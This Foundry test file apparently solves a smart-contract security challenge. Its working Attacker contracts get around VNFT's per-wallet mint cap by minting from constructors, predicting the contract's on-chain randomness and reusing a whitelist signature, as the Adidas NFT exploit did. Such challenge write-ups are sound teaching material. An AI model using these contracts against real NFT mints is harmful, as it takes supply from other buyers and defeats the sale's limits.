// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/VNFT.sol";

/// @notice A generic interface for a contract which properly accepts ERC721 tokens.
/// @author Solmate (https://github.com/Rari-Capital/solmate/blob/main/src/tokens/ERC721.sol)
abstract contract ERC721TokenReceiver {
    function onERC721Received(address, address, uint256, bytes calldata) external virtual returns (bytes4) {
        return ERC721TokenReceiver.onERC721Received.selector;
    }
}

interface IVNFT {
    function imFeelingLucky(address to, uint256 qty, uint256 number) external;

    function whitelistMint(address to, uint256 qty, bytes32 hash, bytes memory signature) external payable;

    function safeTransferFrom(address from, address to, uint256 id) external;

    function totalSupply() external returns (uint256);

    function balanceOf(address owner) external returns (uint256);
}

/**
 * VNFT.sol prevents minting of more than 2 NFTs per wallet
 * It enforces this by disallowing smart contracts from minting, via
 * require((msg.sender).to.code.length == 0)
 * => A contract has code.length != 0 (obviously), hence cant mint
 *
 * However, during deployment of the contract, code.length actually returns 0
 * This means that we simply have to call the mint function in the constructor
 * of our newly deployed contract.
 *
 * To mint several NFTs in a single transaction, we have to code a function which
 * is deploying several minting contracts for us -- each contract mints the
 * max amount per wallet and sends it to our main wallet
 *
 * This exploit is inspired from the adidas NFT mint, which got exploited
 * in exactly the same way, see:
 * https://cryptonews.com/news/investor-purchases-330-adidas-nfts-using-smart-contract-328-more-than-cap.htm
 */
contract Attacker {
    constructor(address EOA, address vnft) {
        uint256 currentId = IVNFT(vnft).totalSupply();

        uint256 randomNumber =
            uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp, currentId))) % 100;

        IVNFT(vnft).imFeelingLucky(address(this), 2, randomNumber);
        IVNFT(vnft).safeTransferFrom(address(this), EOA, currentId++);
        IVNFT(vnft).safeTransferFrom(address(this), EOA, currentId);

        selfdestruct(payable(EOA));
    }

    function onERC721Received(address, address, uint256, bytes calldata) external virtual returns (bytes4) {
        return ERC721TokenReceiver.onERC721Received.selector;
    }
}

contract AttackerWhitelist {
    constructor(address EOA, address vnft, bytes32 hash, bytes memory signature) {
        uint256 currentId = IVNFT(vnft).totalSupply();

        IVNFT(vnft).whitelistMint(address(this), 2, hash, signature);
        IVNFT(vnft).safeTransferFrom(address(this), EOA, currentId++);
        IVNFT(vnft).safeTransferFrom(address(this), EOA, currentId);

        selfdestruct(payable(EOA));
    }

    function onERC721Received(address, address, uint256, bytes calldata) external virtual returns (bytes4) {
        return ERC721TokenReceiver.onERC721Received.selector;
    }
}

contract VNFTtest is Test {
    VNFT internal vnft;

    address internal alice = vm.addr(1);
    address internal bob = vm.addr(2);

    function setUp() public {
        // bob deploys contract
        vm.prank(bob);
        vnft = new VNFT();
    }

    function testClaiming() public {
        vm.expectRevert(bytes("Only EOA allowed"));
        vnft.imFeelingLucky(address(this), 2, 1337);

        // alice performs all subsequent calls, since minting from contracts is disallowed
        vm.startPrank(alice);

        vm.expectRevert(bytes("Invalid quantity"));
        vnft.imFeelingLucky(address(this), 3, 1337);

        vm.expectRevert(bytes("Better luck next time!"));
        vnft.imFeelingLucky(address(this), 1, 1337);

        vm.stopPrank();
    }

    function testAttack() public {
        // alice exploits the NFT contract
        vm.startPrank(alice);

        // deploy several smart contracts, each one is minting 2 nfts and sending those to alice
        for (uint256 i; i < 5; i++) {
            new Attacker(alice, address(vnft));
        }

        vm.stopPrank();

        // check if 10 NFTs were minted
        assertEq(10, vnft.balanceOf(alice));
    }

    function testAttackWhitelist() public {
        // bob signs message for whitelist mint
        bytes32 hash = keccak256("EthernautDAO");
        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(2, keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash)));
        bytes memory signature = abi.encodePacked(r, s, v);

        // bob mints first via whitelistMint
        vm.prank(bob);
        vnft.whitelistMint(bob, 2, hash, signature);

        // then alice attacks
        vm.startPrank(alice);

        // deploy several smart contracts, each one is minting 2 nfts and sending those to alice
        for (uint256 i; i < 5; i++) {
            new AttackerWhitelist(alice, address(vnft), hash, signature);
        }

        vm.stopPrank();

        // check if 10 NFTs were minted
        assertEq(10, vnft.balanceOf(alice));
    }
}
